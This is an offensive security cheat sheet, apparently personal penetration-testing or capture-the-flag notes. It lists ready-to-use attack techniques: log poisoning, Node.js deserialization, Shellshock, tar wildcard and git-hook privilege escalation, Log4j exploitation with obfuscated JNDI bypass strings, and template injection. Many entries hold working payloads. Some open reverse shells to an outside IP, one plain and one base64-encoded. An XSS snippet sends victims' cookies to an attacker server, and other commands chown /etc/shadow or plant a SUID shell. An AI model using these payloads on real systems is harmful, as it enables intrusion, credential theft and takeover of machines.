# TOOLS FOR TESTING VULNERABILITIES IN JAVA PLATFORMS
	> https://github.com/joaomatosf/jexboss

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# LOG POISONING FOR REVERSE SHELL
	> confirm the path of log files (apache2 - /var/log/apache2/access.log
	> intercept request of the web page that is vulnerable to lfi
	> add { <?php passthru($_GET['cmd']); ?> } in user agent
								or
	  add <?php file_put_contents('reverse.php', file_get_contents('[url+reverse.php]')); ?> in user agent
	  							or
	  use exploit/multi/script/web_delivery on metasploit to craft a simple payload
	> request the url to read the log file and include "cmd" parameter to execute commands
	> execute wget command to download php reverse shell from local machine
	> execute the php reverse shell while the listener is up
	> get the reverse shell

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# FIREFOX CONFIG FILE
	> compress firefox config file and download to local machine
	> python3 firefox-decrypt.py [file name]
	> get possible credential stored inside

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# PYTHON MODULE HIJACKING

	EXAMPLE: #!/usr/bin/env python3
		 from compare import *
		 print(compare.Str('hello', 'hello', 'hello'))
	> echo """
			import os
			os.system("/bin/bash")
		   """ > /tmp/compare.py
	> export PYTHONPATH="/tmp"

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# NODE.JS DESERIZALIZATION EXPLOITATION
	> use nodejsshell.py to create a payload
		:: {"rce":"_$$ND_FUNC$$_function (){ [PUT THE PAYLOAD HERE!!!!]}()"}
	> intercept the vulnerable website page with burpsuite
	> encode the payload created into base64
	> replace the encoded payload with the cookies in the intercepted website page in burpsuite
	> set up a listener
	
	> {"email":"test@test.com","rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.231 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()"}

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# NODE.JS REPLACE ERROR
	> means that the site is expecting a parameter
	> see if it is injectable

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# PHP DESERIALIZATION EXPLOITATION
	> https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# SHELLSHOCK EXPLOIT
	> find the attack vector for shellshock exploit to be successful e.g --> cgi-bin script
	> curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" "http://ip/cgi-bin/test.cgi" 
	> execute reverse shell command to get reverse shell


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# STEAL USER COOKIES WITH XSS VULNERABILITY
	> start a php server on local machine
		:: php -S local-ip:port
	> paste below code on the page where the vulnerability is found
		:: <svg onload='var x = document.createElement("IFRAME");x.setAttribute("src", "http://10.4.64.135:8080/cookie?"+document.cookie);document.body.appendChild(x);''/>

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# TAR WILDCARD PE
	> cat > shell.sh << EOF
		:: #!/bin/bash
		:: /bin/bash
		:: EOF
	> chmod +x shell.sh
	> echo "" > "--checkpoint-action=exec.sh shell.sh"
	> echo "" > --checkpoint=1
	> tar cf archive.tar *

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# RATE LIMIT BYPASS
	> add below headers to the HTTP request
		:: X-Originating-IP: 127.0.0.1
		:: X-Forwarded-For: 127.0.0.1
		:: X-Remote-IP: 127.0.0.1
		:: X-Remote-Addr: 127.0.0.1
		:: X-Client-IP: 127.0.0.1
		:: X-Host: 127.0.0.1
		:: X-Forwarded-Host: 127.0.0.1

	> use burpsuite or wfuzz to bruteforce POST HTTP data
		:: wfuzz -c -z file,numbers.txt -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Client-IP: 127.0.0.1" -H "X-Host: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -d "number=FUZZ" --hw 81 http://example.com:80/

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# BYPASS KEYWORDS RESTRICTED WITH BUILT-IN MODULES IN PYTHON
	> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')

# CHANGE FILE OWNER WITH PYTHON
	> python3 -c 'import os;os.chown("/etc/shadow",1000,1000)'

# EXPLOITING PYTHON FUNCTIONS
	> https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
	> input the following command into python input()
        	:: __import__('os').system('nc -e /bin/bash 10.4.64.135 4444')
        	:: this will give us a reverse shell

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# VERIFY IF AN APPLICATION IS VULNERABLE TO LOG4J
	> setup a listener
		:: nc -lvnp 4444	
	> find a location where you can supply JNDI syntax e.g -- url parameter & http headers
		:: curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:4444\}'
	> the server will then try to connect to the ip address on port 4444 if there is a log4j vulnerability


# EXPLOITING LOG4J VULNERABILITY - OPTION 1
	> starts a ldap server
		:: java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS/#Exploit"
	> create a java exploit code as follow and save it as Exploit.java
		:: public class Exploit {
				static {
					try {
						java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.4.64.135 4444");
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
		   }
	> compile Exploit.java with 'javac Exploit.java'
	> start a listener on port 4444
	> host the payload on a http.server
	> finally trigger the exploit by firing off the JNDI syntax
		:: curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/Exploit\}'
		:: curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/Exploit}'
	> the attack sequence is as follow
		:: once the JNDI syntax is executed, it first connects to ldap server which will redirect to a http server
		:: the http server will host a java payload with contains a reverse shell script
		:: the vulnerable machine will execute the java payload and that will result us a reverse shell


# EXPLOITING LOG4J VULNERABILITY - OPTION 2
	> run JNDI-Exploit-Kit
		:: java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L "10.4.64.135:1389" -C "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC40LjY0LjEzNSA5OTk5ID4vdG1wL2Y= | base64 -d | bash"
	> set up a listener accordingly
	> trigger the exploit by firing off the JNDI syntax with the URL provided by JNDI-Exploit-Kit
		:: curl http://example.com/ -H 'X-Api-Version: ${jndi:ldap://10.4.64.135:1389/vct1ie}'
		:: curl 'http://example.com?foo=$\{jndi:ldap://10.4.64.135:1389/vctlie}'


# JNDI PAYLOAD BYPASSES
	> ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}

	> ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}

	> ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}

	> ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}

	> ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}

	> ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
		:: this uses RMI instead of LDAP

	> ${${::-j}ndi:rmi://attackerendpoint.com/}
		:: this uses RMI instead of LDAP

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# EXPLOITING SERVER SIDE TEMPLATE INJECTION
	> http://example.com/404.page{{7+7}}
		:: if the request is successful, the result of the addition will be displayed

	> http://example.com/404.page{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
		:: this will give us a reverse shell on port 9999

# EXPLOITING SERVER SIDE TEMPLATE INJECTION FOR RCE
	> *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("ping 10.10.1.10")}

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# REPLACING FILE WITH CUSTOMIZED FILE WITH FILE UPLOAD
	> example.com has a file upload functionality where we can upload any file but we cant trigger any kind of that files
	> assume we know the application has enabled debugger which means that the application will update its sources to any changes
	> the application's config file is views.py in /app/app directory on the server
	> customized the views.py and upload it, then intercept the request
	> in the intercepted request, change the file name to /app/app/views.py (absolute path so that the application will not ignore it) because we want to replace the original views.py in /app/app directory on the server instead of uploading the file to /uploads directory on the server

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# ABUSING GIT HOOKS
	> any Git repo has a .git directory and one of the folders is hooks
	> by default it has a bunch of .sample files however hooks will skip .sample files but not the others
	> we can exploit this by writing a bash script with a regular name without .sample extension inside hooks directory
		:: echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
		:: chmod +x pre-commit
	> the exploit copy /bin/bash into /tmp/0xdf, change owner to root and sets it to SUID
	> when someone tries to commit, pre-commit file will run

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

# READ UNAUTHORIZED SYSTEM FILES WITH RACE CONDITION
	> assume there is a file that disallow unauthorized user to read it
	> unauthorized user can read the file with race condition exploitation
	> first upload this .c file into the target machine
		:: 	#define _GNU_SOURCE
			#include <stdio.h>
			#include <fcntl.h>
			#include <stdio.h>
			#include <unistd.h>
			#include <sys/syscall.h>
			#include <linux/fs.h>

			int main(int argc, char *argv[]) {
			  while (1) {
			    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
			  }
			  return 0;
			}
		:: the code above constantly exchange names between 2 files
		:: since the script will run constantly, we can read the file because the file cant keep up with the constant name changes and therefore raise the race condition vulnerability
	> compile the .c script and run it with 2 files as the arguments
		:: gcc rename.c -o rename
		:: ./rename secret_file_to_read random_file
	> now while the rename script keeps running, we can try to read the secret_file_to_read

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++